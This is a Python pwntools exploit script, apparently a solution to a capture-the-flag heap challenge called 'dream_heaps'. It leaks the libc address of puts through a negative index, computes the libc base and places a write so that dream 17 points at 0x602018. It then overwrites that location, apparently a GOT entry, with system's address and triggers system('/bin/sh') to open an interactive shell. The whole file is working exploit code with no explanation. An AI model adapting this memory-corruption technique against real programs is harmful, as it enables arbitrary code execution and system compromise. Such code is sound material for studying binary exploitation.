from pwn import *


target = process('./dream_heaps')
# gdb.attach(target, gdbscript='b *0x004009b1')
libc = ELF('libc-2.31.so')


def write_dream(length, dream):
    target.recvuntil('> ')
    target.sendline('1')
    target.recvline()
    target.sendline(str(length))
    target.recvline()
    target.sendline(dream)


# leak the address of puts
target.recvuntil('> ')
target.sendline('2')
target.recvuntil('Which dream would you like to read?\n')
target.sendline('-263021')
puts_leak = target.recvuntil('What')
puts_leak = puts_leak.replace(b'What', b'')
print(f'raw puts_leak: {puts_leak}')
puts_leak = u64(puts_leak + b'\x00' * (8 - len(puts_leak)))
print(f'puts_leak: {hex(puts_leak)}')
libc_base = puts_leak - libc.symbols['puts']

# fill with dreams
write_dream(10, '/bin/sh\x00')
write_dream(0x20, '0' * 10)
write_dream(0x30, '1' * 10)
write_dream(0x40, '2' * 10)
write_dream(0x50, '3' * 10)
write_dream(0x60, '4' * 10)
write_dream(0x70, '5' * 10)
write_dream(0x80, '6' * 10)
write_dream(0x90, '7' * 10)
write_dream(0xa0, '8' * 10)
write_dream(0xb0, '9' * 10)
write_dream(0xc0, 'a' * 10)
write_dream(0xd0, 'b' * 10)
write_dream(0xe0, 'c' * 10)
write_dream(0xf0, 'd' * 10)
write_dream(0x11, 'e' * 10)
write_dream(0x22, 'f' * 10)
write_dream(0x18, 'g' * 10)
write_dream(0x602018, '0' * 10)

# write the address of system at 0x602018, since it is our 17th dream
target.recvuntil('> ')
target.sendline('3') # edit dream
target.recvline()
target.sendline(str(17))
system_addr = p64(libc_base + libc.symbols['system'])[:6]
print(f'system would be at {system_addr}')
target.send(system_addr) # if I put sendline it will append a newline !!!!!

# call the delete option that will trigger the system call
target.recvuntil('> ')
target.sendline('4')
target.recvline()
target.sendline('0')

target.interactive()
